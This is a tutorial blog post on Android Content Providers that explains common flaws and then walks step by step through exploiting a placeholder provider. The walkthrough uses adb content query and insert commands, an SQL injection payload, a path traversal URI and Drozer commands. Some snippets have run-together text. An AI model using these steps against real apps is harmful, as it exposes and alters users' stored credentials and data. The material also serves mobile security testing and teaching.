---
title: "Android Content Providers"
date: 2026-02-17
Categories: [android, content-providers, mobile]
tags: [android, tutorials, content-providers]
---

---

## What Are Content Providers?

In **Android**, a **Content Provider** is a component that manages access to structured data and allows data sharing between applications.

Think of it as:

> 🗄️ A secure database interface exposed to other apps.
> 

Instead of directly accessing another app’s database, you must go through its Content Provider.

## Why Content Providers Exist

Android apps are sandboxed.

App A **cannot** directly read App B's database.

So Android provides a controlled mechanism:

- Standard interface
- Permission-based access
- URI-based addressing

## Security Perspective

Content Providers are one of the **most exploited Android components**.

Common vulnerabilities:

---

### 🔥 1. Exported Provider Without Permission

If:

```xml
android:exported="true"
```

And no permission required →

ANY app can read the data.

---

### 🔥 2. SQL Injection

If provider builds raw SQL queries like:


```java
"SELECT * FROM users WHERE name = '" + input +"'"
```

Attacker can inject:

```bash
' OR 1=1--
```

### 🔥 3. Path Traversal

Improper URI handling may allow access to internal files.

### 🔥 4. Sensitive Data Exposure

```
Tokens
API keys
Credentials
Logs
```


## How to exploit a vulnerable provider step-by-step

### Step 1️⃣ Identify Exported Providers

Decompile the APK using:

- `jadx`
- `apktool`
- `aapt dump xmltree`

Look inside `AndroidManifest.xml` for:

```xml
<providerandroid:name=".DataProvider"android:authorities="com.victim.provider"android:exported="true" />
```

 🔎 What You're Looking For:

- `android:exported="true"`
- No `readPermission`
- No `writePermission`

If exported without protection → potential vulnerability.

---

### Step 2️⃣ Extract the Authority

Example:

```xml
android:authorities="com.victim.provider"
```

The base URI becomes:

```
content://com.victim.provider/
```

This is the entry point.

---

### Step 3️⃣ Enumerate Paths (Tables)

Look inside provider code:

```java
uriMatcher.addURI("com.victim.provider","users",1);
uriMatcher.addURI("com.victim.provider","tokens",2);
```

That tells you valid paths:

```
content://com.victim.provider/userscontent://com.victim.provider/tokens
```

If source code is unavailable, you fuzz common names:

- users
- accounts
- auth
- tokens
- config
- logs

---

### Step 4️⃣ Query the Provider via ADB

Android includes a built-in `content` tool.

Example:

```bash
adb shell content query --uri content://com.victim.provider/users
```

If data is returned → provider is readable.

Example output:

```
Row:0 _id=1name=adminpassword=123456
```

🚨 That’s sensitive exposure.

---

### Step 5️⃣ Test Write Access

Try inserting:

```bash
adb shell content insert \
--uri content://com.victim.provider/users \
--bind name:s:hacker \
--bind password:s:1234
```

If successful → unauthorized data modification.

---

### Step 6️⃣ Test for SQL Injection

If the provider builds raw queries insecurely, try injecting through selection:

```bash
adb shell content query \
--uri content://com.victim.provider/users \
--where"name='admin' OR 1=1--"
```

If all records return → SQL injection exists.

---

### Step 7️⃣ Check for File Access / Path Traversal

If provider handles files:

Try:

```
content://com.victim.provider/../../../../data/data/com.victim/databases/db
```

Misconfigured providers may expose internal files.

---

### Step 8️⃣ Automate Using Drozer

Using **Drozer**:

List providers:

```
run app.provider.info -a com.victim.app
```

Query provider:

```
run app.provider.query content://com.victim.provider/users
```

This speeds up enumeration massively.

---